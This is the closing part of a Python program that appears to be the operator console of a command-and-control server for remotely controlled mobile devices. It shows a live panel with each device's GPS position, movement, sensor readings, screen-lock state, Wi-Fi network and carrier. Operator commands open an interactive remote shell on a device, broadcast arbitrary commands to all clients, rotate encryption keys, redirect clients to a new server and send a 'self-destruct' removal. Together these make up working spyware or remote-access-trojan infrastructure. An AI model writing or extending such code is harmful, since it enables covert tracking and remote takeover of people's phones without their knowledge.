        print(panel_line(C.DIM + "Old key".ljust(18) + C.RESET + C.WHITE + "*" * len(OLD_ENCRYPTION_KEY_STR) + C.RESET + "  " + C.BYELLOW + "(rotation active)" + C.RESET))
    print(panel_line(C.DIM + "Port".ljust(18) + C.RESET + C.WHITE + str(SERVER_PORT) + C.RESET))
    print(panel_line(C.DIM + "Bind address".ljust(18) + C.RESET + C.WHITE + SERVER_BIND_ADDRESS + C.RESET))
    print(panel_line(C.DIM + "Auth window".ljust(18) + C.RESET + C.WHITE + str(AUTH_WINDOW_MS // 1000) + "s" + C.RESET))
    print(panel_line(C.DIM + "Socket timeout".ljust(18) + C.RESET + C.WHITE + str(SOCKET_TIMEOUT_SEC) + "s" + C.RESET))
    print(panel_line(C.DIM + "Upload dir".ljust(18) + C.RESET + C.WHITE + UPLOAD_DIR + C.RESET))
    print(panel_line(C.DIM + "Data dir".ljust(18) + C.RESET + C.WHITE + DATA_DIR + C.RESET))
    print(panel_line())
    print(panel_bottom())
    print()


def listen_width():
    try:
        w = shutil.get_terminal_size((80, 24)).columns
    except Exception:
        w = 80
    return max(60, min(w - 4, 110))


def _num(tel, key, default=None):
    v = tel.get(key, default)
    if v is None:
        return default
    try:
        return float(v)
    except Exception:
        return default


def _int(tel, key, default=None):
    v = tel.get(key, default)
    if v is None:
        return default
    try:
        return int(v)
    except Exception:
        return default


def _str(tel, key, default="?"):
    v = tel.get(key, default)
    if v is None:
        return default
    return str(v)


def _fmt_age(ms):
    if ms < 1000:
        return f"{ms:.0f}ms"
    if ms < 60_000:
        return f"{ms/1000:.1f}s"
    if ms < 3_600_000:
        return f"{ms/60_000:.1f}m"
    return f"{ms/3_600_000:.1f}h"


def render_listen_frame(did, tel):
    w = listen_width()
    inner = w - 4

    def line(content=""):
        plain = ANSI_RE.sub('', content)
        pad = max(0, inner - len(plain))
        return C.BCYAN + "│" + C.RESET + "  " + content + (" " * pad) + C.BCYAN + "│" + C.RESET

    def div(label=""):
        if label:
            head = "─ " + label + " "
            pad = w - 2 - vis_len(head)
            return C.BCYAN + "├" + head + ("─" * max(0, pad)) + "┤" + C.RESET
        return C.BCYAN + "├" + ("─" * (w - 2)) + "┤" + C.RESET

    out = []
    out.append(C.BCYAN + "┌" + ("─" * (w - 2)) + "┐" + C.RESET)
    header = (C.BOLD + C.BWHITE + "LISTEN" + C.RESET + "  " + C.BWHITE + did + C.RESET
              + "   " + C.DIM + datetime.now().strftime("%H:%M:%S") + C.RESET)
    out.append(line(header))

    if tel is None:
        out.append(div("status"))
        out.append(line(C.BYELLOW + "waiting for telemetry from device…" + C.RESET))
        out.append(line(C.DIM + "(device must be online)" + C.RESET))
        for _ in range(20):
            out.append(line(""))
        out.append(C.BCYAN + "└" + ("─" * (w - 2)) + "┘" + C.RESET)
        out.append("")
        out.append("  " + C.DIM + "Ctrl+C to exit" + C.RESET)
        sys.stdout.write("\033[2J\033[H" + "\n".join(out))
        sys.stdout.flush()
        return

    age_s = (time.time() * 1000 - tel.get("ts", 0)) / 1000.0
    if age_s < 5:     dot = C.BGREEN + "●" + C.RESET
    elif age_s < 15:  dot = C.BYELLOW + "●" + C.RESET
    else:             dot = C.BRED + "●" + C.RESET

    sess_ms = _num(tel, "session_ms", 0) or 0
    seq = _int(tel, "seq", 0) or 0
    out.append(line(f"{dot} live   session {_fmt_age(sess_ms)}   sample #{seq}   last {age_s:.1f}s ago"))

    out.append(div("location"))
    lat = _num(tel, "lat"); lon = _num(tel, "lon")
    if lat is not None and lon is not None:
        acc_m = _num(tel, "acc_m", 0) or 0
        prov = _str(tel, "provider", "?")
        out.append(line(f"{C.BWHITE}{lat:.6f}, {lon:.6f}{C.RESET}   ± {acc_m:.0f} m   {C.DIM}{prov}{C.RESET}"))
        alt = _num(tel, "alt")
        spd = _num(tel, "speed", 0) or 0
        brg = _num(tel, "bearing", 0) or 0
        alt_str = f"alt {alt:.1f} m" if alt is not None else "alt ?"
        out.append(line("  " + "   ·   ".join([alt_str, f"{spd * 3.6:.1f} km/h", f"bearing {brg:.0f}°"])))
        d_start = _num(tel, "distance_from_start_m", 0) or 0
        d_total = _num(tel, "total_distance_m", 0) or 0
        eg = _num(tel, "elev_gain_m", 0) or 0
        el = _num(tel, "elev_loss_m", 0) or 0
        alt_trend = _str(tel, "alt_trend", "steady")
        out.append(line(f"  travelled {d_total/1000:.3f} km   from start {d_start:.0f} m   ↑{eg:.0f} m  ↓{el:.0f} m   alt {alt_trend}"))
        fa = _int(tel, "fix_age_ms")
        if fa is not None:
            out.append(line(f"  {C.DIM}fix age {_fmt_age(fa)}{C.RESET}"))
    else:
        out.append(line(f"{dot} no location fix"))

    out.append(div("motion"))
    mc = _str(tel, "motion_class", "?")
    mcc = {"still": C.DIM, "walking": C.BGREEN, "running": C.BYELLOW,
           "driving": C.BCYAN, "shake": C.BMAGENTA, "freefall": C.BRED}.get(mc, C.WHITE)
    flags = []
    if tel.get("freefall"):       flags.append(C.BRED + "FREEFALL" + C.RESET)
    if tel.get("shake"):          flags.append(C.BMAGENTA + "SHAKE" + C.RESET)
    if tel.get("held_in_hand"):   flags.append(C.BGREEN + "in hand" + C.RESET)
    if tel.get("pocket_detected"): flags.append(C.BYELLOW + "in pocket" + C.RESET)
    fs = "   ".join(flags) if flags else C.DIM + "—" + C.RESET
    out.append(line(f"{mcc}{mc.upper()}{C.RESET}   {fs}"))

    ax = _num(tel, "accel_x", 0) or 0
    ay = _num(tel, "accel_y", 0) or 0
    az = _num(tel, "accel_z", 0) or 0
    am = _num(tel, "accel_mag", 0) or 0
    av = _num(tel, "accel_var", 0) or 0
    out.append(line(f"  accel  x {ax:+7.3f}   y {ay:+7.3f}   z {az:+7.3f}   mag {am:6.3f}   var {av:.3f}"))
    gx = _num(tel, "gyro_x", 0) or 0
    gy = _num(tel, "gyro_y", 0) or 0
    gz = _num(tel, "gyro_z", 0) or 0
    gm = _num(tel, "gyro_mag", 0) or 0
    out.append(line(f"  gyro   x {gx:+7.4f}   y {gy:+7.4f}   z {gz:+7.4f}   mag {gm:7.4f}"))
    lx = _num(tel, "lin_x", 0) or 0
    ly = _num(tel, "lin_y", 0) or 0
    lz = _num(tel, "lin_z", 0) or 0
    lm = _num(tel, "lin_mag", 0) or 0
    out.append(line(f"  linear x {lx:+7.3f}   y {ly:+7.3f}   z {lz:+7.3f}   mag {lm:6.3f}"))

    out.append(div("orientation"))
    yaw = _num(tel, "yaw"); pitch = _num(tel, "pitch"); roll = _num(tel, "roll")
    if yaw is not None and pitch is not None and roll is not None:
        out.append(line(f"yaw {yaw:+7.1f}°   pitch {pitch:+7.1f}°   roll {roll:+7.1f}°"))
    compass = _num(tel, "compass")
    if compass is not None:
        dirs = ["N", "NE", "E", "SE", "S", "SW", "W", "NW"]
        arrow = dirs[int(((compass + 22.5) % 360) / 45)]
        tilt = _num(tel, "tilt_deg", 0) or 0
        out.append(line(f"compass {compass:5.1f}° {arrow}   tilt {tilt:.1f}° from flat"))
    orient = _str(tel, "orientation", "?")
    rot = _int(tel, "screen_rotation", 0) or 0
    rs = {0: "portrait", 90: "landscape-left", 180: "portrait-flipped", 270: "landscape-right"}.get(rot, str(rot))
    out.append(line(f"{C.DIM}device {orient}   screen rotation {rot}° ({rs}){C.RESET}"))

    out.append(div("environment"))
    lux = _num(tel, "lux")
    if lux is not None:
        trend = _str(tel, "lux_trend", "steady")
        out.append(line(f"light     {lux:7.1f} lux      {C.DIM}{trend}{C.RESET}"))
    prox = _num(tel, "proximity")
    if prox is not None:
        st = "NEAR" if prox < 3 else "far"
        out.append(line(f"proximity {prox:7.1f}          {C.DIM}{st}{C.RESET}"))
    p = _num(tel, "pressure_hpa")
    if p is not None:
        trend = _str(tel, "pressure_trend", "steady")
        out.append(line(f"pressure  {p:7.2f} hPa     {C.DIM}{trend}{C.RESET}"))
    t_amb = _num(tel, "amb_temp_c")
    if t_amb is not None:
        out.append(line(f"temp      {t_amb:7.2f}°C"))
    mag_s = _num(tel, "mag_strength")
    if mag_s is not None:
        out.append(line(f"magnetic  {mag_s:7.2f} µT"))
    mx = _num(tel, "mag_x", 0) or 0
    my = _num(tel, "mag_y", 0) or 0
    mz = _num(tel, "mag_z", 0) or 0
    out.append(line(f"  {C.DIM}mag x {mx:+7.2f}  y {my:+7.2f}  z {mz:+7.2f}{C.RESET}"))

    steps_total = _int(tel, "steps_total")
    if steps_total is not None:
        out.append(div("steps"))
        ss = _int(tel, "steps_session", 0) or 0
        cad = _int(tel, "cadence_spm", 0) or 0
        out.append(line(f"total {steps_total}   session {ss}   cadence {cad} spm"))

    out.append(div("power"))
    pct = _int(tel, "battery_pct", -1) or -1
    chg = tel.get("charging", False)
    src = _str(tel, "charge_source", "none")
    pc = C.BGREEN if pct > 50 else (C.BYELLOW if pct > 20 else C.BRED)
    cs = f"{C.BGREEN}⚡ {src}{C.RESET}" if chg else C.DIM + "not charging" + C.RESET
    out.append(line(f"{pc}{pct}%{C.RESET}   {cs}"))
    btemp = _num(tel, "battery_temp_c")
    bvolt = _int(tel, "battery_voltage_mv")
    bcurr = _int(tel, "battery_current_ma")
    parts = []
    if btemp is not None: parts.append(f"{btemp:.1f}°C")
    if bvolt is not None: parts.append(f"{bvolt} mV")
    if bcurr is not None: parts.append(f"{bcurr} mA")
    if parts:
        out.append(line("   ".join(parts)))
    thermal = _str(tel, "thermal", "?")
    ps = tel.get("power_save", False)
    doze = tel.get("doze", False)
    out.append(line(f"{C.DIM}thermal {thermal}   power-save {ps}   doze {doze}{C.RESET}"))

    out.append(div("screen & audio"))
    son = tel.get("screen_on", False)
    locked = tel.get("screen_locked", False)
    bright = _int(tel, "screen_brightness", -1) or -1
    scr = (C.BGREEN + "ON" + C.RESET) if son else (C.DIM + "OFF" + C.RESET)
    lk = (C.BYELLOW + "locked" + C.RESET) if locked else (C.BGREEN + "unlocked" + C.RESET)
    out.append(line(f"screen {scr}   {lk}   brightness {bright}/255"))
    ringer = _str(tel, "ringer_mode", "?")
    music = tel.get("music_active", False)
    vol = _int(tel, "media_volume", -1) or -1
    headset = _str(tel, "headset", "None")
    dnd = tel.get("dnd")
    ds = "  " + C.BYELLOW + "DND" + C.RESET if dnd is True else ""
    out.append(line(f"ringer {ringer}{ds}   music {'on' if music else 'off'}   vol {vol}   headset {headset}"))

    out.append(div("network"))
    transport = _str(tel, "net_transport", "?")
    metered = tel.get("net_metered", False)
    vpn = tel.get("vpn_active", False)
    extras = []
    if metered: extras.append(C.BYELLOW + "metered" + C.RESET)
    if vpn:     extras.append(C.BGREEN + "VPN" + C.RESET)
    out.append(line(f"{C.WHITE}{transport}{C.RESET}   " + "   ".join(extras)))
    ssid = _str(tel, "wifi_ssid", "")
    if ssid and ssid not in ("?", "<unknown ssid>", '"<unknown ssid>"'):
        rssi = _int(tel, "wifi_rssi")
        freq = _int(tel, "wifi_freq")
        link = _int(tel, "wifi_link_mbps")
        parts = [ssid.strip('"')]
        if rssi is not None: parts.append(f"{rssi} dBm")
        if freq is not None: parts.append(f"{freq} MHz")
        if link is not None: parts.append(f"{link} Mbps")
        out.append(line("   ".join(parts)))
        bssid = _str(tel, "wifi_bssid", "")
        if bssid and bssid not in ("?",):
            out.append(line(C.DIM + f"bssid {bssid}" + C.RESET))
    op = _str(tel, "cell_operator", "")
    if op:
        ctype = _int(tel, "cell_data_net_type")
        ct = {0:"?",1:"GPRS",2:"EDGE",3:"UMTS",4:"CDMA",5:"EVDO0",6:"EVDOA",7:"1xRTT",8:"HSDPA",
              9:"HSUPA",10:"HSPA",11:"iDEN",12:"EVDOB",13:"LTE",14:"eHRPD",15:"HSPAP",16:"GSM",
              17:"TD-SCDMA",18:"IWLAN",19:"LTE-CA",20:"NR"}.get(ctype, str(ctype))
        dbm = _int(tel, "cell_dbm")
        parts = [op, ct]
        if dbm is not None: parts.append(f"{dbm} dBm")
        out.append(line("   ".join(parts)))
    bt = _int(tel, "bt_bonded")
    air = tel.get("airplane", False)
    bits = []
    if bt is not None: bits.append(f"BT bonded {bt}")
    if air: bits.append(C.BYELLOW + "airplane" + C.RESET)
    if bits:
        out.append(line("   ".join(bits)))

    out.append(C.BCYAN + "└" + ("─" * (w - 2)) + "┘" + C.RESET)
    out.append("")
    out.append("  " + C.DIM + "Ctrl+C to exit" + C.RESET)
    sys.stdout.write("\033[2J\033[H" + "\n".join(out))
    sys.stdout.flush()


def console_thread():
    global broadcast_command, broadcast_command_encrypted
    global SERVER_ENCRYPTION_KEY_STR, SERVER_AES_KEY, OLD_ENCRYPTION_KEY_STR, OLD_AES_KEY

    print("  " + C.DIM + "type" + C.RESET + " " + C.BCYAN + "help" + C.RESET + " " + C.DIM + "for commands" + C.RESET)
    print()

    while True:
        try:
            line = input(C.BCYAN + "> " + C.RESET).strip()
            if not line:
                continue

            if line == "help":
                print_help()
            elif line == "show":
                print_show()
            elif line == "clear":
                os.system("clear" if sys.platform != "win32" else "cls")
                print_banner()
            elif line == "config":
                print_config()
            elif line.startswith("setkey "):
                nk = line[7:].strip()
                if len(nk.encode('utf-8')) != 16:
                    print("  " + tag("ERROR", C.BRED) + " key must be exactly 16 chars")
                else:
                    OLD_ENCRYPTION_KEY_STR = SERVER_ENCRYPTION_KEY_STR
                    OLD_AES_KEY = SERVER_AES_KEY
                    SERVER_ENCRYPTION_KEY_STR = nk
                    SERVER_AES_KEY = derive_aes_key(nk)
                    cid = generate_command_id()
                    full = "updatekey " + nk + " (ID-" + cid + ")"
                    broadcast_command_encrypted = aes_encrypt(full, OLD_AES_KEY)
                    set_broadcast_command(full)
                    print("  " + tag("KEY", C.BGREEN) + " rotation started  " + C.DIM + "·" + C.RESET + "  old key valid for 5 min")

                    def rem_old():
                        global OLD_ENCRYPTION_KEY_STR, OLD_AES_KEY
                        time.sleep(300)
                        OLD_ENCRYPTION_KEY_STR = ""; OLD_AES_KEY = b""
                        print("\n  " + tag("KEY", C.BYELLOW) + " old key expired\n")

                    threading.Thread(target=rem_old, daemon=True).start()
            elif line.startswith("updateserver "):
                nu = line[13:].strip()
                if nu:
                    cid = generate_command_id()
                    set_broadcast_command("updateserver " + nu + " (ID-" + cid + ")")
                    print("  " + tag("SERVER", C.BCYAN) + " URL pushed  " + C.DIM + "·" + C.RESET + "  " + C.WHITE + nu + C.RESET)
            elif line == "info":
                cid = generate_command_id()
                set_broadcast_command("info (ID-" + cid + ")")
                print("  " + tag("INFO", C.BCYAN) + " request sent  " + C.DIM + "·" + C.RESET + "  " + C.DIM + cid + C.RESET)
            elif line.startswith("remove "):
                target = line[7:].strip()
                removed = block_client(target)
                if removed:
                    for ip, did in removed:
                        cid = generate_command_id()
                        enqueue_targeted(did, "remove (ID-" + cid + ")")
                        print("  " + tag("REMOVE", C.BRED) + " " + ip + "  " + C.DIM + "·" + C.RESET + "  " + C.WHITE + did + C.RESET + "  " + C.DIM + "self-destruct sent" + C.RESET)
                else:
                    print("  " + tag("REMOVE", C.BYELLOW) + " no client found: " + target)
            elif line.startswith("listen "):
                parts = line.split()
                if len(parts) < 2:
                    print("  " + tag("LISTEN", C.BYELLOW) + " usage: listen <deviceID>"); continue
                tid = parts[1].upper()
                with clients_lock:
                    if tid not in clients:
                        print("  " + tag("LISTEN", C.BRED) + " client not connected: " + tid); continue
                sid = generate_command_id()
                enqueue_targeted(tid, "listen_start (ID-" + sid + ")")
                with telemetry_lock:
                    latest_telemetry.pop(tid, None)
                try:
                    while True:
                        with telemetry_lock:
                            tel = latest_telemetry.get(tid)
                        render_listen_frame(tid, tel)
                        time.sleep(1)
                except KeyboardInterrupt:
                    pass
                finally:
                    sid = generate_command_id()
                    enqueue_targeted(tid, "listen_stop (ID-" + sid + ")")
                    sys.stdout.write("\033[2J\033[H")
                    print("  " + tag("LISTEN", C.BYELLOW) + " stopped  ·  " + tid)
                    print()
            elif line.startswith("shell "):
                parts = line.split()
                if len(parts) < 2:
                    print("  " + tag("SHELL", C.BYELLOW) + " usage: shell <deviceID>"); continue
                tid = parts[1].upper()
                with clients_lock:
                    if tid not in clients:
                        print("  " + tag("SHELL", C.BRED) + " client not connected: " + tid); continue
                print()
                print("  " + tag("SHELL", C.BGREEN) + " connected to " + C.BOLD + tid + C.RESET)
                print("  " + C.DIM + "type " + C.RESET + C.BCYAN + "quit()" + C.RESET + C.DIM + " to exit, " + C.RESET + C.BCYAN + "!help" + C.RESET + C.DIM + " for shell commands" + C.RESET)
                print()
                sid = generate_command_id()
                enqueue_targeted(tid, "shellstart (ID-" + sid + ")")
                with pending_lock:
                    pending_commands[tid] = {}
                while True:
                    try:
                        cmd = input(C.DIM + "shell " + C.BCYAN + tid + C.RESET + C.DIM + " > " + C.RESET).strip()
                        if not cmd:
                            continue
                        if cmd == "quit()":
                            sid = generate_command_id()
                            enqueue_targeted(tid, "shellstop (ID-" + sid + ")")
                            print("  " + tag("SHELL", C.BYELLOW) + " disconnected")
                            print()
                            with pending_lock:
                                if tid in pending_commands:
                                    del pending_commands[tid]
                            break
                        if cmd == "!help":
                            print("  " + C.BCYAN + "!help" + C.RESET + C.DIM + "   show this help" + C.RESET)
                            print("  " + C.BCYAN + "!int" + C.RESET + C.DIM + "    send SIGINT (Ctrl+C)" + C.RESET)
                            print("  " + C.BCYAN + "quit()" + C.RESET + C.DIM + "  exit shell" + C.RESET)
                            print("  " + C.DIM + "<cmd>   run shell command (streams live)" + C.RESET)
                            continue
                        if cmd == "!int":
                            iid = generate_command_id()
                            enqueue_targeted(tid, "shellint (ID-" + iid + ")")
                            print("  " + tag("SHELL", C.BYELLOW) + " SIGINT sent")
                            continue
                        cid = generate_command_id()
                        enqueue_targeted(tid, "shellcmd " + cmd + " (ID-" + cid + ")")
                    except KeyboardInterrupt:
                        iid = generate_command_id()
                        enqueue_targeted(tid, "shellint (ID-" + iid + ")")
                        print("\n  " + tag("SHELL", C.BYELLOW) + " ^C sent to device")
                    except EOFError:
                        break
            elif re.match(r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[A-F0-9]{6})\s', line, re.I):
                parts = line.split(maxsplit=1)
                target = parts[0]; ct = parts[1]
                cid = generate_command_id()
                enqueue_targeted(target, ct + " (ID-" + cid + ")")
                print("  " + tag("SEND", C.BCYAN) + " -> " + target + "  " + C.DIM + "·" + C.RESET + "  " + C.DIM + cid + C.RESET)
            else:
                cid = generate_command_id()
                set_broadcast_command(line + " (ID-" + cid + ")")
                print("  " + tag("BROADCAST", C.BCYAN) + " command sent  " + C.DIM + "·" + C.RESET + "  " + C.DIM + cid + C.RESET)
        except EOFError:
            break
        except Exception as e:
            print("  " + tag("ERROR", C.BRED) + " " + str(e))


class ReuseTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


def main():
    print_banner()
    print("  " + C.DIM + "key" + C.RESET + "        " + C.WHITE + "*" * len(SERVER_ENCRYPTION_KEY_STR) + C.RESET)
    print("  " + C.DIM + "listening" + C.RESET + "  " + C.WHITE + "http://" + SERVER_BIND_ADDRESS + ":" + str(SERVER_PORT) + C.RESET)
    print()
    threading.Thread(target=console_thread, daemon=True).start()
    with ReuseTCPServer((SERVER_BIND_ADDRESS, SERVER_PORT), RequestHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print()
            print("  " + tag("SHUTDOWN", C.BYELLOW) + " stopping server")
            print()
            httpd.shutdown()


if __name__ == "__main__":
    main()
